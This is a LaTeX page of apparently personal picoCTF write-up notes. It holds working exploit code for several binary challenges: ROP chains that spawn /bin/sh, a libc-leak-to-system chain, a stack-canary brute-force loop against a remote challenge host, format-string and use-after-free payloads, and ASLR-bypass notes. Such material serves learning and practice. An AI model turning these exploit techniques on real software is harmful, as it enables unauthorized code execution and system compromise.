\documentclass[main.tex]{subfiles}

\begin{document}

% 20 - 20 - 24 - 27 - 30 - 33
\begin{tikzpicture}
	\createpin{cgadget0}{35,0}
	\begin{absnode}{cgadget0}{70}{0x080b073a : pop eax ; ret}
		\begin{python}
			def mov_eax(value):
			    return 0x080B073A, value
		\end{python}
	\end{absnode}
	
	\createpin{cgadget1}{35,-20}
	\begin{absnode}{cgadget1}{70}{0x080b361a : push eax ; call edx
		       \\\vspace{-2mm}0x080583b9 : pop edx ; pop ebx ; ret}
		\begin{python}
			# affectee: eax, edx
			def mov_ebx(value, modify_eax, modify_edx):
			    return modify_edx(0x080583B9), modify_eax(value),          0x080B361A
		\end{python}
	\end{absnode}
	
	\createpin{cgadget2}{35,-52}
	\begin{absnode}{cgadget2}{70}{0x080939d8 : mov ecx, eax ; mov eax, ecx ; ret}
		\begin{python}
			# affectee: eax
			def mov_ecx(value, modify_eax=mov_eax):
			    return modify_eax(value),              0x080939D8
		\end{python}
	\end{absnode}
	
	\createpin{cgadget3}{35,-78.2}
	\begin{absnode}{cgadget3}{70}{0x0806ca26 : xchg edx, eax ; ret}
		\begin{python}
			# affectee: eax
			def mov_edx(value, modify_eax=mov_eax):
			    return modify_eax(value),              0x0806CA26
		\end{python}
	\end{absnode}
	
	\createpin{cgadget4}{35,-104.8}
	\begin{absnode}{cgadget4}{70}{0x0807add3 : push esp ; call eax
			       \\\vspace{-2mm}0x0804b27e : pop esi ; pop edi ; ret}
		\begin{python}
			# affectee: eax
			def mov_edi_esp(modify_eax=mov_eax):
			    return modify_eax(0x0804B27E),           0x0807ADD3
		\end{python}
	\end{absnode}

	\createpin{cgadget5}{35,-133.6}
	\begin{absnode}{cgadget5}{70}{0x08069997 : add eax, edi ; pop edi ; ret}
		\begin{python}
			# affectee: eax
			CLOBBER = b"kim."
			def mov_eax_esp(offset, modify_eax=mov_eax):
			    return mov_edi_esp(),    modify_eax(offset),             0x08069997,                   CLOBBER
		\end{python}
	\end{absnode}
	
	\createpin{cgadget6}{35,-170.2}
	\begin{absnode}{cgadget6}{70}{0x0805ee44 : push edx ; push ebx ; call eax
			       \\\vspace{-2mm}0x0804b27d : pop ebx ; pop esi ; pop edi ; ret}
		\begin{python}
			# affectee: undefined
			def push_edx_ebx(modify_eax=mov_eax):
			    return modify_eax(0x0804B27D), 0x0805EE44
		\end{python}
	\end{absnode}
	
	\createpin{filename}{106,0}
	\begin{absnode}{filename}{62}{}
		\begin{python}
			def filename():
			    return 0x00, b"/bin//sh", 0x00
		\end{python}
	\end{absnode}
	
	\createpin{argv}{106,-20}
	\begin{absnode}{argv}{62}{}
		\begin{python}
			def argv(offset):
			    return mov_ebx(                        offset, mov_eax_esp, mov_edx),             mov_edx(0x00),        push_edx_ebx()
		\end{python}
	\end{absnode}

	\createpin{syscall}{106,-49.6}
	\begin{absnode}{syscall}{62}{0x0804a3c2 : cd80}
		\begin{python}
			def syscall():
			    return 0x0804A3C2
		\end{python}
	\end{absnode}
	
	\createpin{payload}{106,-69.6}
	\begin{absnode}{payload}{62}{\href{https://x86.syscall.sh}{[x86.syscall.sh]}}
		\begin{python}
			part_payload = flat(
			  # populate buffer
			  cyclic(0x1C),
			  # construct argv = {&filename, NULL}
			  argv(0xA8),
			  
			  # assign ebx = &filename
			  mov_ebx(0x64, mov_eax_esp, mov_edx),
			  # assign ecx = &argv[0]
			  mov_ecx(-0x40, mov_eax_esp),
			  # assign edx = &argv[1]
			  mov_edx(-0x5C, mov_eax_esp),
			  # assign eax = 11
			  mov_eax(0x0B),
			  # magic begin here!!!
			  syscall(),
			  
			  # construct filename
			  filename(),
			)
		\end{python}
	\end{absnode}
	
	\createpin{gdb}{250,0}
	\begin{absnode}[-1]{gdb}{70}{Bash commands}
		\begin{bash}
			ROPgadget --binary ?
			ROPgadget --binary ? --opcode cd80
		\end{bash}
	\end{absnode}

	\createpin{snippet}{250,-20}
	\begin{absnode}[-1]{snippet}{70}{Python snippet}
		\begin{python}
			#!/bin/python3
			from pwn import *
			
			context.arch = "i386"
			part_payload = "FILL PAYLOAD HERE!!!"
			
			start_script = """
			    continue
			"""
			program_paths = [
			    "nc saturn.picoctf.net 61457",
			    "./vuln",
			]
			
			if args.REMOTE:
			    program_path = program_paths[0].split()
			else:
			    program_path = program_paths[1]
			
			p = process(program_path)
			
			if not args.REMOTE:
			    # context.log_level = "debug"
			    context.gdb_binary = "pwndbg"
			    gdb.attach(p, gdbscript=start_script)
			
			p.sendline(part_payload)
			p.interactive()
		\end{python}
	\end{absnode}
	
	\createpin{gdb}{250,-125.3}
	\begin{absnode}[-1]{gdb}{70}{Bash commands}
		\begin{bash}
			pwninit # if patchelf does not solve :)
			checksec --file=?
			patchelf --set-interpreter ? ?
		\end{bash}
	\end{absnode}
	
	\createpin{stackcache0}{176,0}
	\begin{absnode}[1]{stackcache0}{68}{[stack cache] -- THIS IS NOT A PART OF ropfu SOLUTION !!!}
		\begin{python}
			CLOBBER = b"kim."
			def mov(reg, value):
			    # pop eax ; ret
			    if reg == "eax":
			        return 0x080B4D7A, value
			    # pop ecx ; add al, 0xf6 ; ret
			    if reg == "ecx":
			        return 0x080647EF, value
			    # pop edx ; xor eax.. ; pop edi ; ret
			    if reg == "edx":		
			        return 0x08070BD5, value, CLOBBER
			
			def xchg_eax(reg):
			    # xchg esi, eax ; ret
			    if reg == "esi":
			        return 0x0805D022
			
			# 0x0804900e : ret
			def stack_align():
			    return 0x0804900E
		\end{python}
	\end{absnode}
	
	\createpin{stackcache1}{176,-79.3}
	\begin{absnode}{stackcache1}{68}{[stack cache] -- THIS IS NOT A PART OF ropfu SOLUTION !!!}
		\begin{python}
			# 0x08059632 : push eax ; push edx ;          push esi ; call ecx
			# 0x08049ba0 : pop edi ; ret
			part_payload = flat(
			    cyclic(0xE),
			    0x08049810,  # win
			    stack_align(),  # !overwrite flag
			    
			    xchg_eax("esi"),  # esi -> flag
			    mov("edx", 0x080CF0A4),  # %s\n
			    mov("ecx", 0x08049BA0),
			    mov("eax", 0x0804995F),
			    xchg_eax("esi"),  # esi -> printf
			    0x08059632,
			    cyclic(0x14),
			    0x08049970,  # main
			)
		\end{python}
	\end{absnode}

	\createpin{aslr}{250,-149.3}
	\begin{absnode}[-1]{aslr}{70}{Address Space Layout Randomization \href{https://github.com/rjwalls/CS4401-notes/blob/master/2099-01-09-aslr.md}{[CS4401]}}
		\texttt{ASLR} will not randomize bits \texttt{0-11}\\\textit{cuz that would break page alignment} \\\\
		\texttt{ASLR} will also not randomize bits \texttt{28-31}\\\textit{cuz it would make it harder to allocate big pages}\\\\
		2common to bypass \texttt{coarse-grained ASLR}:
		\begin{enumerate}
			\item[\texttt{i.}] \texttt{information leaks}
			\item[\texttt{ii.}] \texttt{brute forcing} -- often practical due to a lack of entropy in 32-bit address spaces
		\end{enumerate}
	\end{absnode}
	
	\createpin{free}{142.5, -149.3}	
	\begin{absnode}[-1]{free}{70}{}
		\includegraphics[width=\linewidth]{image/free.png}
	\end{absnode}
	
	\drawcatenary{stackcache0}{stackcache1}{0}
\end{tikzpicture}

\newpage

\begin{minipage}[t]{0.49\textwidth}
	\begin{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[seed-sPRiNG]} Using \texttt{time(null)} as a seed-generation function is the procedure's most critical flaw due to its predictability and low granularity. Solving it only requires reversing it and modifying it to print the numbers we need
		\item[\texttt{[\_]}] 
		\begin{minipage}[t]{0.37\textwidth}
			\texttt{[buffer overflow 3]} Just examine byte by byte. Not a hard problem, but I still need a hint to solve it \texttt{:)}
			\vspace{1em}
			\item[\texttt{[\_]}] \texttt{[Unsubscriptions Are Free]} \texttt{Use-After-Free} \texttt{reused} chunk
			\begin{bash}
				(
				  # scanf(stdio buffer)
				  printf 'I\rY\rl';
				  
				  # stdio buffer resolve
				  sleep 1;
				   
				  # read(file descriptor 0)
				  printf '\xd6\x87\x04\x08';
				)
			\end{bash}
		\end{minipage}
		\hfill
		\begin{minipage}[t]{0.52\textwidth}
			\begin{bash}
				#!/bin/bash
				canary="\x42\x69" #...
				target="nc saturn.picoctf.net 52460"
				
				for i in {0..255}; do
				    itohex="\x$(printf "%02x" $i)"
				    (
				        perl -E 'print "68\n","a"x64'
				        printf "${canary}${itohex}"
				    ) > payload
				    
				    output=$(cat payload | $target)
				    if [[ "$output" != *Smash* ]]; then
				        printf "%02x" $i
				        break
				    fi
				done
			\end{bash}
		
		\end{minipage}
		\item[\texttt{[\_]}] \texttt{[Cache Me Outside]} Change the metadata (at the top of the heap, ... or the arena) that points to the newest freed chunk! Two frustrating problems are the missing \texttt{ld} (just using \texttt{pwninit} or finding out the compatible \texttt{glibc} version, then downloading the related compatible \texttt{ld}) and the missing \texttt{flag.txt} (reversing solved the problem) \\[0.3em]
		\makebox[\linewidth][c]{\texttt{printf "-\%d{\textbackslash}n{\textbackslash}x00" \$((0x6034a0-0x602088))}}
		\item[\texttt{[\_]}] \texttt{[offset-cycleV2]} Apply the same approach as \texttt{[buffer overflow 3]}, but automate the identification of the canary value
	\end{enumerate}
	
	\setlength{\parskip}{0.4em}
	\userline
	
	\setlength{\parskip}{1em}
	\begin{enumerate}
		\setlength{\parskip}{0.9em}
		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} \texttt{[ropfu]} 
		\begin{enumerate}[leftmargin=0pt, labelindent=0pt]
			\item[] I handle two interleaved processes: identifying gadgets and constructing a possible relevance payload layout. In which the first one is processed under some criteria:
			\item[] \texttt{(i) } Finding gadgets that modify the required registers (\texttt{eax}, \texttt{ebx}, \texttt{ecx}, \texttt{edx}) as little as possible and, if possible, only modify \texttt{eax}, which acts as a temporary register
			\item[] \texttt{(ii)} Because of ASLR stack placement randomization, I assume nothing about the real-time absolute address in the stack; that is the reason for \texttt{mov\_eax\_esp}
		\end{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[\_\_Epilogue\_\_]} Well, I did something very complex, right? I skimmed through an online write-up (because of my laziness, I don’t reference anything here!) that points out that the \texttt{NX} bit is turned off, so a simpler way is to write shellcode into the stack, then populate the stack with \texttt{NOPs}, and finally, hopefully, point \texttt{eip} to the \texttt{NOPs} area
	\end{enumerate}
\end{minipage}
\hfill
\begin{minipage}[t]{0.49\textwidth}
	\begin{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[Here's a LIBC]} Very similar to \texttt{ropfu}, but here we need to determine: ``How can the \texttt{libc} address be leaked?'' as directed by the title\\
		To solve this, we need to print the address of a function -- \texttt{puts}, in this case -- in \texttt{libc}, and the rest of the process is just as straightforward as in \texttt{ropfu}\\\\
		\begin{minipage}[t]{0.37\textwidth}
			\begin{python}
				# 0x400913 : pop rdi ; ret
				def mov_rdi(value):
				    return 0x400913, value
				
				puts_puts_byte =         \
				lambda x: flat(
				    cyclic(0x88),
				    # puts.got.plt + offs
				    mov_rdi(0x601018 + x),
				    0x400540,  # puts.plt
				    0x400771,  # main
				)
				
				def rop_chain(_puts):
				    time.sleep(3)
				    _libc = _puts - 0x080A30
				    _system = _libc+0x04F4E0
				    _bin_sh = _libc+0x1B40FA
				    
				    return flat(
				        cyclic(0x88),
				        stack_align(),
				        mov_rdi(_bin_sh),
				        _system,
				    )
			\end{python}
		\end{minipage}
		\hfill
		\begin{minipage}[t]{0.52\textwidth}
			\begin{python}
				# 0x40052e : ret
				def stack_align():
				    return 0x40052E
				
				# expect: 0000 7f?? ???? ????
				def extract_puts_address():
				    time.sleep(3)  # start-up time
				    pbytes, _ = [], p.recv(timeout=2.9)
				    
				    for i in range(7, -1, -1):
				        p.sendline(puts_puts_byte(i))
				        time.sleep(1)  # delay time
				        _ = p.recv(timeout=0.9)
				        
				        if not "size" in locals()             or len(_) == size:
				            pbytes.append(0x00)
				            size = len(_)
				            continue
				        
				        pchar = _.split(b"\n", 1)[1][0]
				        pbytes.append(pchar)
				    
				    return int.from_bytes(              pbytes, "big")
			\end{python}
		\end{minipage}
		
		\item[\texttt{[\_]}] \texttt{[stack cache]} Well, nothing’s interesting there. Just other \texttt{ROP} problem w ``cache''
		\item[\texttt{[\_]}] \texttt{[Guessing Game 2]} Has been the most fascinating yet frustrating problem so far!!!
		\setlength{\parskip}{0.4em}
		\begin{enumerate}[leftmargin=0pt, labelindent=0pt]
			\item[] Its allure lies in the intricate challenges it presents:\\ \texttt{(i)} understanding \texttt{page\_size}, \texttt{(ii)} mastering format strings to leak the canary and libc addresses, and ultimately \texttt{(iii)} constructing a successful \texttt{ROP} chain
			\item[] On the other hand, the frustration comes from the absence of a warning when the executable runs normally with a mismatched \texttt{libc} version
		\end{enumerate}
		\setlength{\parskip}{0.6em}
		\begin{python}
			# random.dynsym.value L: 0x000405c0 and libc.base.value B: 0x?????000 
			payload2nguess = -2623 # rand % 4096 == sgn(B+L) * mod(|B+L|, 0x1000)
		\end{python}
		\begin{python}
			# canary [EBP - 12]  # winner [EBP - 524]  # PUSH &winner [EBP - 552]
			payload2canary = b"%x" * 118 + b"-%X"             # dunno ???
			payload2canary = b"%p" * 134 + b"-%X"             # 4x = 552 -  12 
			payload2printf = b"%p" *  13 + b"%s" + printf.got # 4x = 552 - 524 + 2x
		\end{python}
	\end{enumerate}
\end{minipage}
\end{document}
